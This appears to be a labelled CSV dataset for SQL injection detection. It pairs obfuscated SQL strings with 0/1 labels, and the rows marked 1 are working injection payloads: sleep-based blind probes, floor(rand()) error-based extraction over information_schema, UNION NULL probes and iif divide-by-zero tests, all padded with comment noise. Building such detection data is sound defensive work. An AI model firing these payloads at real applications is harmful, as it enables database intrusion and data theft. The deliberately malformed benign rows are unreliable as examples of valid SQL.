Query,label
"SELECT @* FROM/*..Q	0x4*/border/*8L]*/WHERE/*0x1fc*/gift IN/*d""	*/ (/**/SELECT/*y-*/givingFROMown/*c){f*/) ",0
"SELECT/*(SELECT (SELECT 11)) AND ""s)qj"" LIKE ""s)qj"" AND (SELECT 1)#t>(Y50*/option_value/**/FROM/**/wp_options/*+S|=_TE/*/WHERE/*%N*/option_name  LIKE  'zcf_captcha_settings' LIMIT/**/1%Yq",0
"SELECT/*d. OR 0x22cf!=(SELECT (SELECT 8911)) AND 1/**/AND 1 OR 9183 NOT LIKE 9183 OR 6715 LIKE 6716#@*/* FROMoutline /**/WHERE simplest/**/NOT =/*a]*/'[hill]%'%p",0
"select   (  case when   (  (SELECT 0x1fb1)  =  0x2315  )   then 0x1fb1 else (SELECT 1)/  (  select 0x0  )/**/  end  )/**//*L]e,-~+leY|eN`+-**/--G5`h",1
"1%""/*I5M[E*/ )   or elt  (  0x1880  = /**/(SELECT 0x1880),sleep  (  0x5   )   /*fQ@*/)/**/   and/*:o7*//* && True AND True#*/ ( /*-zZn*/""%""  = /**/""+
kznLKi;",1
SELECT/**/kind/**/FROM/*H3{zj*/avoid/**/UNION SELECT/*T4zmx*/hurt/**/FROM/**/fastened/**//**/ OR /**/DER/**/BY/*X/:%'u AND 0x2367=9063 OR False#z*/fortCS,0
"SELECT AVG ( later/*w5(1Pa*/) /*N	xETCX0H*
V*/FROM/**/gray /**/SELECT SUM/**/( salmon	)/*T
$@\*/",0
"1'   )  /*<,#*/ )    or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  0x23d5,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (/**/   (/*<< &qu>N2g*//*
-U#)^teL'*/ 'rdpv'  LIKE  'rdpvEZkTi",1
"SELECT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 1))))))=^l
*/**/FROM/*y_:kN*/third/*cu,*/WHERE   /**/NOT habit LIKE/**/'design'",0
"/*(Hz2aAXwcm*/ SELECT
softlyID AS/*F(S	2*/ID,/*R:R*/understanding AS/*<DdLu8c((l]K*/discussionFROM type",0
"1,iif /*E*/(  0x1d33/*Dy;!*/ LIKE /**/7475,1,1/0x0 /*D{u{0eKNP\~*/)  ",1
"SELECT/*""g=	
Pdwb?BFMQ*/ZDg>*/**/FROM/**/immediately FETCH FIRST 0x32 PERCENT/**/ROWS/**/ONLYSELECTTOP0x3 * FROM/*VM_|T/**/&(v*/together",0
"SELECT */*M~)""5z%fw\Pk?(h:xne*/FROM/**/master FETCH FIRST 0x3 ROWS/*q*/ONLY/**/SELECT TOP (SELECT/**/0x32) PERCENT/*v*/*/*@0x5*/FROM/*kK|Xk+=q^HWVD <*/beauty",0
SELECT/*f_XKfR=Rw*/*/*faV OR 'm'='mc' OR '.Zh.' NOT LIKE '.Zh.' OR 0 AND4218=4218#;D_r*/FROM/**/easier/**/WHERE/*Ut]*/soon LIKE 'hunt' /**/ OR  minerals LIKE/**/'from'F{U$I+(|-I,0
"1""   )   )     )   unionall selectnull,null,null--",1
"-5182""   )   /*/|/99""*/)    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 0x1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )   AND ""T1"" NOT = ""T1;"" ORFalse OR False OR False AND True#w&WwpUN;ieDK",1
"SELECTpost_id, meta_key, meta_value FROM wp_postmetaWHEREpost_id IN  ( (SELECT 0x152d) )   OR DER/*S6egf.BCJC
~3CRLFh>~f06m'Vdc|-1`|525 AND 65 LIKE 65#w*/BYmeta_id ASC`",0
"iif/*Ec<wgach*/ (  6369  =  5881,1,1/0  )/*e!qASEOFA{*//**/",1
1%' and /*0x0&0*/ (  select * from   (  select  (  sleep  (  (SELECT 0x5)/**/  ) /**/  )   /*.\(SELECT5)*/ )/**/ fzno  ) /*{{hu^i*/ and/**/'%'/*pRn5Em*/ LIKE  ',1
"SELECT/*]V)F*/*/***x*/FROM/**/scientistWHERE/**/old NOT/* AND 9448 IN (9447,9448,9449)#/5/vgB*/LIKE/*seJ\*/'form%'X",0
